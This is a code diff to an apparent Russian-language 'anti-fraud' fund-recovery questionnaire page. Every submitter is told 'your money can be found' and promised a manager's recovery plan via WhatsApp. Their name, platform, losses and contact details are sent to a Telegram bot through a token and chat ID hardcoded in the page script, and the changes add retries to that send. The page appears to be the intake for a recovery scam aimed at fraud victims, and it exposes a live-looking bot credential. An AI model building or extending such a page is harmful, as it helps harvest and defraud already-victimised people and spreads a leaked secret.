@@ -45,26 +45,39 @@
 
     <!-- SUCCESS -->
     <div id="successScreen" class="card card-lg hidden" style="text-align:center">
-      <div style="font-size:64px;margin-bottom:16px">✅</div>
-      <h2 style="font-size:24px;font-weight:900;margin-bottom:8px;color:var(--green)">Заявка отправлена!</h2>
-      <p style="color:var(--muted);font-size:15px;margin-bottom:6px">Ваши деньги можно найти</p>
-      <p style="color:var(--muted);font-size:14px;margin-bottom:20px">Наш менеджер свяжется с вами в ближайшее время</p>
-      <div style="background:var(--card);border-radius:12px;padding:16px;margin-bottom:12px;text-align:left">
-        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
-          <span style="font-size:12px;color:var(--muted)">Номер заявки</span>
-          <span style="font-size:18px;font-weight:900;color:var(--green)" id="appNum">#AF-2606-3847</span>
+      <div style="width:80px;height:80px;border-radius:50%;background:rgba(16,185,129,0.15);display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:40px">✅</div>
+      <h2 style="font-size:24px;font-weight:900;margin-bottom:12px">Заявка успешно отправлена!</h2>
+      <div style="background:rgba(16,185,129,0.06);border:1px solid rgba(16,185,129,0.2);border-radius:12px;padding:16px;margin-bottom:20px">
+        <p style="font-size:15px;font-weight:600;color:var(--green);margin-bottom:4px">💰 Ваши деньги можно найти</p>
+        <p style="font-size:13px;color:var(--muted)">Мы проверили вашу ситуацию и считаем, что шансы на возврат есть</p>
+      </div>
+
+      <div style="background:var(--card);border-radius:12px;padding:16px;margin-bottom:16px;text-align:left">
+        <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--border)">
+          <span style="font-size:13px;color:var(--muted)">Номер заявки</span>
+          <span style="font-size:16px;font-weight:800;color:var(--green)" id="appNum">#AF-2606-3847</span>
         </div>
-        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
-          <span style="font-size:12px;color:var(--muted)">Способ связи</span>
+        <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--border)">
+          <span style="font-size:13px;color:var(--muted)">Имя</span>
+          <span style="font-size:14px;font-weight:600" id="nameDisplay">—</span>
+        </div>
+        <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--border)">
+          <span style="font-size:13px;color:var(--muted)">Платформа</span>
+          <span style="font-size:14px;font-weight:600" id="platformDisplay">—</span>
+        </div>
+        <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0">
+          <span style="font-size:13px;color:var(--muted)">Способ связи</span>
           <span style="font-size:14px;font-weight:600" id="contactDisplay">WhatsApp</span>
         </div>
-        <div style="display:flex;justify-content:space-between;align-items:center">
-          <span style="font-size:12px;color:var(--muted)">Статус</span>
-          <span style="font-size:13px;font-weight:600;color:var(--green)">Ожидайте звонка менеджера</span>
-        </div>
       </div>
-      <p style="font-size:13px;color:var(--muted);margin-bottom:20px">📱 Менеджер напишет вам в <strong id="contactPlatform">WhatsApp</strong> в течение 24 часов</p>
+
+      <div style="background:rgba(59,130,246,0.06);border:1px solid rgba(59,130,246,0.2);border-radius:12px;padding:14px;margin-bottom:20px">
+        <p style="font-size:14px;font-weight:600;color:var(--blue);margin-bottom:4px">📱 Что дальше?</p>
+        <p style="font-size:13px;color:var(--muted)">Наш менеджер напишет вам в <strong id="contactPlatform">WhatsApp</strong> в течение 24 часов. Он свяжется с вами, чтобы обсудить детали и предложить план возврата средств.</p>
+      </div>
+
       <a href="/anti-fraud-portal/check.html" class="btn btn-primary" style="width:100%">📋 Проверить статус дела</a>
+      <a href="/anti-fraud-portal/" class="btn btn-outline" style="width:100%;margin-top:8px">🏠 На главную</a>
     </div>
 
   </div>
@@ -227,8 +240,10 @@ async function showResult() {
   const appNum = `AF-${y}${m}-${seq}`;
 
   document.getElementById('appNum').textContent = '#' + appNum;
-  document.getElementById('contactPlatform').textContent = answers.contact || 'WhatsApp';
+  document.getElementById('contactPlatform').textContent = answers.contact?.replace(/[📱💬✈️]\s*/g, '') || 'WhatsApp';
   document.getElementById('contactDisplay').textContent = answers.contact || 'WhatsApp';
+  document.getElementById('nameDisplay').textContent = answers.fullName || '—';
+  document.getElementById('platformDisplay').textContent = answers.platform || '—';
 
   // Save locally
   const cases = getCases();
@@ -261,15 +276,22 @@ async function showResult() {
 ├ Доплаты: ${answers.extraPayment || '?'}
 └ «Юрист»: ${answers.fakeHelp || '?'}`;
 
-  try {
-    const res = await fetch(`https://api.telegram.org/bot8829750295:AAEdnt-7FPCVuVbgj6tgn7eC2_2LpY5VHCk/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: '8471070560', text: msg, parse_mode: 'Markdown' })
-    });
-    const data = await res.json();
-    if (!data.ok) console.error('Telegram error:', data);
-  } catch(e) { console.error('Fetch error:', e); }
+  // Send to Telegram (multiple attempts)
+  for (let attempt = 0; attempt < 3; attempt++) {
+    try {
+      const res = await fetch(`https://api.telegram.org/bot8829750295:AAEdnt-7FPCVuVbgj6tgn7eC2_2LpY5VHCk/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: '8471070560', text: msg })
+      });
+      const data = await res.json();
+      if (data.ok) { console.log('Telegram sent OK'); break; }
+      else console.error('Telegram error attempt ' + attempt, data);
+    } catch(e) {
+      console.error('Fetch error attempt ' + attempt, e);
+      if (attempt < 2) await new Promise(r => setTimeout(r, 1000));
+    }
+  }
 }
 
 // Phone mask
